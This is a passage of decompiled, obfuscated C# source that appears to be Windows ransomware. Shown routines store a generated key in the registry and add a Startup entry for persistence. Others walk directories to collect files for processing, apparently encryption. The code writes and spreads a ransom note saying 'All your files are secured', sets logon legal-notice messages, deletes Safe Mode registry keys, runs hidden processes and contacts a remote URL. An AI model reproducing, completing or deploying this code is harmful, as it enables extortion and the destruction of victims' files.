		if (GIWGhlKkVBAW == getString_0(107396998))
		{
			eULvYjWPkxNKg();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && pOuGkWaUsdiEVOBeOu)
			{
				try
				{
					Thread thread4 = new Thread(LHjBqQfiBctg.XDkzGSDDXywG);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			katTjVhRXIw(getString_0(107396345), SptLhhxIveIbH(getString_0(107396364)));
		}
		SecureString secureString = new SecureString();
		if (vWzJrTKMxwIcuUp == getString_0(107396998))
		{
			yIgCFYujnVKnghS = ffbTyBCSPCnssaSec.tcbINurAbpnGqL(32);
			orecqussiUlGJkD = ffbTyBCSPCnssaSec.DwwHsVZFsX();
		}
		else
		{
			yIgCFYujnVKnghS = getString_0(107396259);
		}
		jlwdVcCVDXv = NBfAhNGgEOukSCU.IWKbJmSvSVmK(yIgCFYujnVKnghS + orecqussiUlGJkD);
		try
		{
			if (!yzxmjEHglZqnOW)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SptLhhxIveIbH(getString_0(107396214)));
				if (registryKey != null)
				{
					registryKey.SetValue(SptLhhxIveIbH(getString_0(107396713)) + (registryKey.ValueCount + 1), jlwdVcCVDXv);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(SptLhhxIveIbH(getString_0(107396214)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(SptLhhxIveIbH(getString_0(107396713)) + (registryKey2.ValueCount + 1), jlwdVcCVDXv);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
		}
		catch (Exception)
		{
			QraByrDhaWPBAswD = true;
		}
		if (oAaXkUAavxB == getString_0(107396888))
		{
			ncDhITKWRvkmW();
		}
		if (HIJDdIyIdbuuE)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), UJdCCmcOabmXjhMvpZ)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), UJdCCmcOabmXjhMvpZ), string.Concat(SptLhhxIveIbH(getString_0(107396672)), new WebClient().DownloadString(SptLhhxIveIbH(getString_0(107396679))), getString_0(107396606), SptLhhxIveIbH(getString_0(107396601)), DateTime.Now, getString_0(107396606), SptLhhxIveIbH(getString_0(107396592)), jlwdVcCVDXv));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), UJdCCmcOabmXjhMvpZ), getString_0(107396503) + jlwdVcCVDXv);
				}
			}
			catch (Exception ex10)
			{
				if (ZQkgwClpBNRNGiD)
				{
					try
					{
						File.AppendAllText(LtQdcjdFVaR, getString_0(107396474) + ex10.Message + getString_0(107396606));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!hazsxBCnQkz)
		{
			BAoKwiwVkX.ItiWJIVSKvc(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), UYUhiRtWDRA), ItgnTBrqjiU(jlwdVcCVDXv), null, null, getString_0(107395945), getString_0(107395896), null);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			bLWBqfVcsqdEE();
		}
		try
		{
			try
			{
				if (vnHLNKxzZjB)
				{
					Console.WriteLine(getString_0(107395911));
				}
			}
			catch
			{
			}
			xLiejUAQVk(new string[1] { getString_0(107395830) }, new string[100]
			{
				getString_0(107395853),
				getString_0(107395848),
				getString_0(107395811),
				getString_0(107395802),
				getString_0(107395797),
				getString_0(107395824),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395777),
				getString_0(107395772),
				getString_0(107395767),
				getString_0(107395794),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395739),
				getString_0(107395734),
				getString_0(107395761),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395714),
				getString_0(107395705),
				getString_0(107395700),
				getString_0(107395727),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107396192),
				getString_0(107396187),
				getString_0(107396182),
				getString_0(107396209),
				getString_0(107396204),
				getString_0(107396199),
				getString_0(107396162),
				getString_0(107396157),
				getString_0(107396152),
				getString_0(107396175),
				getString_0(107396170),
				getString_0(107396165),
				getString_0(107396128),
				getString_0(107395819),
				getString_0(107396123),
				getString_0(107395777),
				getString_0(107396146),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396099),
				getString_0(107396094),
				getString_0(107396089),
				getString_0(107396084),
				getString_0(107396111),
				getString_0(107396106),
				getString_0(107396101),
				getString_0(107396064),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396081),
				getString_0(107396076),
				getString_0(107396071),
				getString_0(107396034),
				getString_0(107396025),
				getString_0(107396020),
				getString_0(107396043),
				getString_0(107395998),
				getString_0(107396123),
				getString_0(107396017),
				getString_0(107396008),
				getString_0(107395967),
				getString_0(107395958),
				getString_0(107395981),
				getString_0(107395972),
				getString_0(107395423),
				getString_0(107395414),
				getString_0(107395437),
				getString_0(107395428),
				getString_0(107395391),
				getString_0(107395386),
				getString_0(107395381),
				getString_0(107395408),
				getString_0(107395403),
				getString_0(107395398),
				getString_0(107395357),
				getString_0(107395352),
				getString_0(107395379),
				getString_0(107395374),
				getString_0(107395369),
				getString_0(107395364),
				getString_0(107395323),
				getString_0(107395346),
				getString_0(107395341),
				getString_0(107396157),
				getString_0(107395336),
				getString_0(107395299),
				getString_0(107395294),
				getString_0(107395289),
				getString_0(107395284),
				getString_0(107395307),
				getString_0(107395302),
				getString_0(107395265),
				getString_0(107395256),
				getString_0(107395283),
				getString_0(107395278)
			}, new string[0], yIgCFYujnVKnghS, getString_0(107395273));
		}
		catch (Exception ex12)
		{
			if (ZQkgwClpBNRNGiD)
			{
				try
				{
					File.AppendAllText(LtQdcjdFVaR, getString_0(107395232) + ex12.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!hazsxBCnQkz || QraByrDhaWPBAswD)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239));
					streamWriter.WriteLine(SptLhhxIveIbH(getString_0(107395206)));
					streamWriter.WriteLine(getString_0(107396606));
					if (SWKzsDHRfwh || !yzxmjEHglZqnOW)
					{
						streamWriter.WriteLine(SptLhhxIveIbH(getString_0(107390232)));
						streamWriter.WriteLine(jlwdVcCVDXv);
					}
					if (nmBOMxoUYyM == getString_0(107396998))
					{
						streamWriter.WriteLine(getString_0(107396606));
						streamWriter.WriteLine(SptLhhxIveIbH(getString_0(107390247)) + Convert.ToString(rhZfJiziUVZGmK.Count));
					}
					if (IrAGOpnAWTw)
					{
						streamWriter.WriteLine(getString_0(107396606));
						streamWriter.WriteLine(SptLhhxIveIbH(getString_0(107390138)));
						streamWriter.WriteLine(CymodjHxdipp.DceQYKwRdb());
					}
				}
				else
				{
					string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239));
					if (!text11.Contains(jlwdVcCVDXv) && !yzxmjEHglZqnOW)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239), getString_0(107390105) + jlwdVcCVDXv);
					}
				}
			}
			catch (Exception ex14)
			{
				if (ZQkgwClpBNRNGiD)
				{
					try
					{
						File.AppendAllText(LtQdcjdFVaR, getString_0(107390076) + ex14.Message + getString_0(107396606));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in LcgkciImoRwcI)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107395239)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239), item + getString_0(107395239), overwrite: true);
					}
					else
					{
						string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239));
						if (!text12.Contains(jlwdVcCVDXv) && !yzxmjEHglZqnOW)
						{
							File.AppendAllText(item + getString_0(107395239), getString_0(107390105) + jlwdVcCVDXv);
						}
					}
				}
				catch (Exception ex16)
				{
					if (ZQkgwClpBNRNGiD)
					{
						try
						{
							File.AppendAllText(LtQdcjdFVaR, getString_0(107390076) + ex16.Message + getString_0(107396606));
						}
						catch (Exception)
						{
						}
					}
				}
				if (!UBvameGFIfHUHT && num > 10)
				{
					break;
				}
			}
		}
		if ((AhZGlKCYOxGTLF == getString_0(107396888) && !hazsxBCnQkz) || (AhZGlKCYOxGTLF == getString_0(107396888) && QraByrDhaWPBAswD))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390575)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390575));
					streamWriter2.WriteLine(SptLhhxIveIbH(getString_0(107390542)));
					streamWriter2.WriteLine(getString_0(107396606));
					if (SWKzsDHRfwh || !yzxmjEHglZqnOW)
					{
						streamWriter2.WriteLine(SptLhhxIveIbH(JNNEVbDzfzG(getString_0(107390493))));
						streamWriter2.WriteLine(jlwdVcCVDXv + SptLhhxIveIbH(getString_0(107390420)));
					}
					if (nmBOMxoUYyM == getString_0(107396998))
					{
						streamWriter2.WriteLine(getString_0(107396606));
						streamWriter2.WriteLine(SptLhhxIveIbH(getString_0(107390439)) + SptLhhxIveIbH(getString_0(107390247)) + Convert.ToString(rhZfJiziUVZGmK.Count) + SptLhhxIveIbH(getString_0(107390420)));
					}
					if (IrAGOpnAWTw)
					{
						streamWriter2.WriteLine(getString_0(107396606));
						streamWriter2.WriteLine(SptLhhxIveIbH(getString_0(107390138)));
						streamWriter2.WriteLine(CymodjHxdipp.DceQYKwRdb());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239));
					if (!text13.Contains(jlwdVcCVDXv) && !yzxmjEHglZqnOW)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390575), SptLhhxIveIbH(getString_0(107390439)) + getString_0(107390105) + jlwdVcCVDXv + SptLhhxIveIbH(getString_0(107390420)));
					}
				}
			}
			catch (Exception ex18)
			{
				if (ZQkgwClpBNRNGiD)
				{
					try
					{
						File.AppendAllText(LtQdcjdFVaR, getString_0(107390378) + ex18.Message + getString_0(107396606));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (eLWkimYmNZYZR == getString_0(107396888))
		{
			try
			{
				if (nmBOMxoUYyM == getString_0(107396998))
				{
					CymodjHxdipp.vgLiOZAEUdA(getString_0(107389809), getString_0(107389804), getString_0(107389759), string.Concat(SptLhhxIveIbH(getString_0(107396672)), new WebClient().DownloadString(SptLhhxIveIbH(getString_0(107396679))), getString_0(107389750), SptLhhxIveIbH(getString_0(107396601)), DateTime.Now, getString_0(107396606), SptLhhxIveIbH(getString_0(107389777)), Convert.ToString(rhZfJiziUVZGmK.Count), getString_0(107396606), SptLhhxIveIbH(getString_0(107396592)), jlwdVcCVDXv));
				}
				else
				{
					CymodjHxdipp.vgLiOZAEUdA(getString_0(107389809), getString_0(107389804), getString_0(107389759), string.Concat(SptLhhxIveIbH(getString_0(107396672)), new WebClient().DownloadString(SptLhhxIveIbH(getString_0(107396679))), getString_0(107389750), SptLhhxIveIbH(getString_0(107396601)), DateTime.Now, getString_0(107396606), SptLhhxIveIbH(getString_0(107389777)), Convert.ToString(rhZfJiziUVZGmK.Count), getString_0(107396606), SptLhhxIveIbH(getString_0(107396592)), jlwdVcCVDXv));
				}
			}
			catch
			{
			}
		}
		if (CjwWPfqENsIeYmjau == getString_0(107396888))
		{
			try
			{
				mlQjbVWuFvmoF.DKUUoSLhXIFMwk(new Uri(getString_0(107389696)));
			}
			catch
			{
			}
		}
		if (AhZGlKCYOxGTLF == getString_0(107396998) && !hazsxBCnQkz)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239)))
				{
					Process.Start(SptLhhxIveIbH(getString_0(107389695)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395239));
				}
			}
			catch
			{
			}
		}
		else if (AhZGlKCYOxGTLF == getString_0(107396888) && !hazsxBCnQkz)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390575)))
				{
					Process.Start(SptLhhxIveIbH(getString_0(107389702)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390575));
				}
			}
			catch
			{
			}
		}
		if (oAaXkUAavxB == getString_0(107396888))
		{
			if (ZChFZQXHGBrkq == getString_0(107396888) && !string.IsNullOrEmpty(grhpSzhfUFSss) && !string.IsNullOrEmpty(vkQWGvhAbRwpa))
			{
				mnmDSEHSlIMW(grhpSzhfUFSss, vkQWGvhAbRwpa);
			}
			else
			{
				mnmDSEHSlIMW(getString_0(107389653), getString_0(107389624));
			}
		}
		if (jbCTnNzVBVE != getString_0(107390022))
		{
			cShyyOHjivmUXHS(jbCTnNzVBVE);
		}
		if (!string.IsNullOrEmpty(bbDDnmCbuvqUmj))
		{
			try
			{
				File.Delete(bbDDnmCbuvqUmj);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397138))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397138)));
			}
		}
		catch (Exception ex20)
		{
			try
			{
				File.AppendAllText(LtQdcjdFVaR, getString_0(107389973) + ex20.Message);
			}
			catch (Exception)
			{
			}
		}
		if (ZQkgwClpBNRNGiD)
		{
			try
			{
				File.AppendAllText(LtQdcjdFVaR, getString_0(107389960));
			}
			catch (Exception)
			{
			}
		}
		if (vMHyPSsXicyI == getString_0(107389915))
		{
			obiNERLnbtQgNNVVN();
		}
	}

	public static void XZAMCnYpryrjLcE()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(SptLhhxIveIbH(JNNEVbDzfzG(getString_0(107389938))), SptLhhxIveIbH(getString_0(107389653)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int SGHYiNTJFGr(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> EobBUtdrrLs(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107389240)) && !text.Contains(getString_0(107389215)) && !text.Contains(getString_0(107389182)) && !text.ToLower().Contains(getString_0(107389197)) && !text.ToLower().Contains(getString_0(107389152)) && !text.Contains(getString_0(107389159)) && !text.Contains(getString_0(107389138)) && !text.ToLower().Contains(getString_0(107389125)) && !text.ToLower().Contains(getString_0(107389080)) && !text.ToLower().Contains(getString_0(107389075)) && !text.ToLower().Contains(getString_0(107389066)) && !text.ToLower().Contains(getString_0(107389529)) && !text.ToLower().Contains(getString_0(107389548)) && !text.ToLower().Contains(getString_0(107389503)) && !text.ToLower().Contains(getString_0(107389514)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107389489)) && !fileInfo.FullName.Contains(getString_0(107389440)) && !fileInfo.FullName.Contains(getString_0(107389455)) && !fileInfo.FullName.Contains(getString_0(107389406)) && !fileInfo.FullName.Contains(getString_0(107389421)) && !fileInfo.FullName.Contains(getString_0(107389372)) && !fileInfo.FullName.Contains(getString_0(107389387)) && !fileInfo.FullName.Contains(getString_0(107389338)) && !fileInfo.FullName.Contains(getString_0(107389357)) && !fileInfo.FullName.Contains(getString_0(107389304)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389323)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388766)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388781)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388732)) && !fileInfo.FullName.Contains(SptLhhxIveIbH(getString_0(107388747))) && !fileInfo.FullName.Contains(getString_0(107388722)) && !fileInfo.FullName.Contains(getString_0(107397138)) && !fileInfo.FullName.Contains(getString_0(107388709)) && !fileInfo.FullName.EndsWith(getString_0(107395273)) && !fileInfo.FullName.EndsWith(getString_0(107388684)) && !fileInfo.FullName.EndsWith(getString_0(107388679)) && !fileInfo.FullName.EndsWith(getString_0(107388642)) && !fileInfo.FullName.EndsWith(getString_0(107388637)) && !fileInfo.FullName.Contains(getString_0(107388632)) && !fileInfo.FullName.Contains(UYUhiRtWDRA) && !fileInfo.FullName.Contains(LtQdcjdFVaR) && !fileInfo.FullName.Contains(UJdCCmcOabmXjhMvpZ))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(LvIpIlmDpOjD) * 1024.0 * 1024.0 && LKrPsTiarBz == getString_0(107396888))
						{
							list.Add(fileInfo.FullName);
							XzxtsGjzzckPDo(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && LKrPsTiarBz == getString_0(107396998))
						{
							list.Add(fileInfo.FullName);
							XzxtsGjzzckPDo(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void eULvYjWPkxNKg()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388647));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!wHJSEylKjdkFOLFWi.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388594), getString_0(107396810)).Replace(getString_0(107388589), getString_0(107388594))
					.Replace(getString_0(107388580), getString_0(107389696))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					wHJSEylKjdkFOLFWi.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388594), getString_0(107396810)).Replace(getString_0(107388589), getString_0(107388594))
						.Replace(getString_0(107388580), getString_0(107389696))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388543), getString_0(107389696)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string katTjVhRXIw(string ZVYIEjBxWCJb = "", string cVIKbeVOcgYew = "")
	{
		string result = getString_0(107389696);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ZVYIEjBxWCJb,
				Arguments = cVIKbeVOcgYew,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void yZDMBpfHtrBSw(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388534),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string JNNEVbDzfzG(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string SptLhhxIveIbH(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void aaNNStcdpFpke(string HVlDtobbKYh = "", string RNEnhHmDuXU = "SW5mb3JtYXRpb24uLi4=", string jSQbOLkanYLFU = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		HVlDtobbKYh = JNNEVbDzfzG(getString_0(107388549));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(SptLhhxIveIbH(HVlDtobbKYh), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(SptLhhxIveIbH(getString_0(107388964)), SptLhhxIveIbH(RNEnhHmDuXU));
				registryKey.SetValue(SptLhhxIveIbH(getString_0(107388899)), SptLhhxIveIbH(jSQbOLkanYLFU));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			HVlDtobbKYh = JNNEVbDzfzG(getString_0(107388902));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(SptLhhxIveIbH(HVlDtobbKYh), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(SptLhhxIveIbH(getString_0(107388253)), SptLhhxIveIbH(RNEnhHmDuXU));
				registryKey.SetValue(SptLhhxIveIbH(getString_0(107388220)), SptLhhxIveIbH(jSQbOLkanYLFU));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void ncDhITKWRvkmW()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (ZChFZQXHGBrkq == getString_0(107396888) && !string.IsNullOrEmpty(grhpSzhfUFSss) && !string.IsNullOrEmpty(vkQWGvhAbRwpa))
				{
					aaNNStcdpFpke(getString_0(107389696), grhpSzhfUFSss, vkQWGvhAbRwpa);
				}
				else
				{
					aaNNStcdpFpke(getString_0(107389696), getString_0(107389653), getString_0(107389624));
				}
			}
		}
		catch
		{
		}
	}

	public static void mnmDSEHSlIMW(string azBQxqrEZL = "SW5mb3JtYXRpb24uLi4=", string UUuXpibSbh = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(SptLhhxIveIbH(azBQxqrEZL));
		val.set_BalloonTipText(SptLhhxIveIbH(UUuXpibSbh));
		val.ShowBalloonTip(30000);
	}

	public static void cShyyOHjivmUXHS(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		katTjVhRXIw(SptLhhxIveIbH(getString_0(107388191)), getString_0(107388206) + text + getString_0(107388197) + string_0);
	}

	public static void yrRqwumzzMappB(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = SptLhhxIveIbH(getString_0(107388160));
		processStartInfo.Arguments = getString_0(107388131) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool BsCWhZGHFFkwCr(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool kxvBhTvGqYhEFqHW(string string_0)
	{
		try
		{
			wbutYhDBNwd CS_0024_003C_003E8__locals0 = new wbutYhDBNwd();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.gYrcodCGJUaC = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.gYrcodCGJUaC);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107388126);
		}
		catch
		{
			return false;
		}
	}

	public static void ZeWwDCIIVUC()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = JNNEVbDzfzG(getString_0(107388117));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(SptLhhxIveIbH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388523)));
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388498)));
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388449)));
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388456)));
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388160)));
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388431)));
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388191)));
					registryKey.Close();
				}
				string_ = JNNEVbDzfzG(getString_0(107388402));
				registryKey = Registry.LocalMachine.OpenSubKey(SptLhhxIveIbH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388305)));
					registryKey.Close();
				}
				string_ = JNNEVbDzfzG(getString_0(107387744));
				registryKey = Registry.LocalMachine.OpenSubKey(SptLhhxIveIbH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388305)));
					registryKey.Close();
				}
				string_ = JNNEVbDzfzG(getString_0(107387744));
				registryKey = Registry.CurrentUser.OpenSubKey(SptLhhxIveIbH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(SptLhhxIveIbH(getString_0(107388305)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			katTjVhRXIw(SptLhhxIveIbH(getString_0(107387759)), SptLhhxIveIbH(getString_0(107387710)));
			katTjVhRXIw(SptLhhxIveIbH(getString_0(107387693)), SptLhhxIveIbH(JNNEVbDzfzG(getString_0(107387684))));
			katTjVhRXIw(SptLhhxIveIbH(getString_0(107387693)), SptLhhxIveIbH(getString_0(107387538)));
			katTjVhRXIw(SptLhhxIveIbH(getString_0(107387957)), SptLhhxIveIbH(getString_0(107387972)));
		}
		catch
		{
		}
	}

	public static void OGgWAVXoBCZ(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(SptLhhxIveIbH(getString_0(107387867)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void bLWBqfVcsqdEE()
	{
		string string_ = JNNEVbDzfzG(getString_0(107387842));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(SptLhhxIveIbH(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(SptLhhxIveIbH(getString_0(107387793)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string AEXwYmaPZOObQu(string TEXEOpDCpjBbs, int WhFFfnIFhFpwoFh = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(WhFFfnIFhFpwoFh);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(TEXEOpDCpjBbs, 1, intPtr, ref WhFFfnIFhFpwoFh) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
